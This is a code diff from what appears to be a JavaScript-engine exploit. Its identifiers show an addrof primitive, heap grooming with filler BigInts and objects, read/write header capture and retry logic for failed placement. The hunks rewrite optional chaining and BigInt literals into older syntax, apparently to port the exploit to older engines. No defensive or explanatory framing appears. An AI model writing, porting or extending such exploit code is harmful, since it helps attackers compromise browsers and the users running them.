@@ -561,7 +561,7 @@ function startAttempt() {
   } catch (error) {
     finishEarlySafeAttempt(
       "SETUP-THREW",
-      `${error?.name}:${String(error?.message).slice(0, 80)}`,
+      `${(error == null ? undefined : error.name)}:${String((error == null ? undefined : error.message)).slice(0, 80)}`,
       "setup-threw",
     );
   }
@@ -669,7 +669,7 @@ function buildAndStoreGraph() {
   emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
   fillerGraph = new Array(0xfffd);
   let pos = 0;
-  const huge = 1n << 40n;
+  const huge = BigInt(1) << BigInt(40);
   for (let b = 0; b < FILLER_BIGINTS; ++b)
     fillerGraph[pos++] = huge + BigInt(b);
   for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
@@ -1041,7 +1041,7 @@ function loadHistoryCritical() {
       candidate === null &&
       result === null &&
       !rwHeaderCaptured &&
-      error?.name === "TypeError";
+      (error == null ? undefined : error.name) === "TypeError";
     if (result !== null) {
       try {
         result[DUPLICATE_INDEX] = undefined;
@@ -1159,7 +1159,7 @@ function beginComposition() {
   if (captureState < 0) {
     finishEarlySafeAttempt(
       "ADDROF-THREW",
-      `${captureError?.name}:` + String(captureError?.message).slice(0, 80),
+      `${(captureError == null ? undefined : captureError.name)}:` + String((captureError == null ? undefined : captureError.message)).slice(0, 80),
       "addrof-threw",
     );
     return;
@@ -1237,8 +1237,8 @@ function reportComposition() {
   if (compositionState < 0) {
     emit(
       retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
-      `${compositionError?.name}:` +
-        String(compositionError?.message).slice(0, 80),
+      `${(compositionError == null ? undefined : compositionError.name)}:` +
+        String((compositionError == null ? undefined : compositionError.message)).slice(0, 80),
     );
     if (!retrySafe) failed();
     else scheduleSafeRetry("placement-throw");
